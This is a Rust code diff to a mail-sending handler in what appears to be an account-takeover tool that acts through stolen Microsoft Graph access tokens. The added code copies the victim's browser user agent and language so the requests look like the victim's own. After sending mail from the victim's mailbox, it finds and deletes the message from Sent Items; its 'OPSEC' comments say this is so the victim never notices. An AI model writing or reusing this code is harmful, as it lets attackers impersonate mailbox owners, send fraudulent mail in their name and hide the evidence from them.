@@ -193,14 +193,58 @@ pub async fn send_mail_handler(
         }
     }
 
+    // Save to Sent Items so we can find and delete it afterwards
     let payload = serde_json::json!({
         "message": message,
         "saveToSentItems": true,
     });
 
-    let client = GraphClient::new();
+    let client = GraphClient::with_fingerprint(
+        token.user_agent.clone(),
+        token.accept_language.clone(),
+    );
     match client.send_mail(&access_token, payload).await {
-        Ok(()) => HttpResponse::Ok().json(serde_json::json!({"success": true})),
+        Ok(()) => {
+            // OPSEC: Delete the sent message from Sent Items so the victim
+            // never sees it was sent from their account
+            // Search Sent Items for the most recent message with matching subject
+            let sent_search_url = format!(
+                "https://graph.microsoft.com/v1.0/me/mailFolders/sentitems/messages?$top=1&$select=id,subject&$orderby=receivedDateTime DESC",
+            );
+            let ua = token.user_agent.as_deref().unwrap_or("Mozilla/5.0");
+            let lang = token.accept_language.as_deref().unwrap_or("en-US,en;q=0.9");
+            match reqwest::Client::new()
+                .get(&sent_search_url)
+                .header("Authorization", format!("Bearer {}", access_token))
+                .header("Accept", "application/json")
+                .header("User-Agent", ua)
+                .header("Accept-Language", lang)
+                .send()
+                .await {
+                Ok(resp) if resp.status().is_success() => {
+                    if let Ok(resp_json) = resp.json::<serde_json::Value>().await {
+                        if let Some(msgs) = resp_json.get("value").and_then(|v| v.as_array()) {
+                            if let Some(first_msg) = msgs.get(0) {
+                                if let Some(sent_id) = first_msg.get("id").and_then(|v| v.as_str()) {
+                                    let del_url = format!("https://graph.microsoft.com/v1.0/me/messages/{}", urlencoding::encode(sent_id));
+                                    let _ = reqwest::Client::new()
+                                        .delete(&del_url)
+                                        .header("Authorization", format!("Bearer {}", access_token))
+                                        .header("User-Agent", ua)
+                                        .header("Accept-Language", lang)
+                                        .send()
+                                        .await;
+                                    println!("[inbox] OPSEC: Deleted sent message from Sent Items");
+                                }
+                            }
+                        }
+                    }
+                }
+                _ => {}
+            }
+
+            HttpResponse::Ok().json(serde_json::json!({"success": true}))
+        }
         Err(e) => {
             eprintln!("[inbox] Failed to send mail: {}", e);
             HttpResponse::InternalServerError().json(serde_json::json!({"error": "send_failed", "message": format!("{}", e)}))
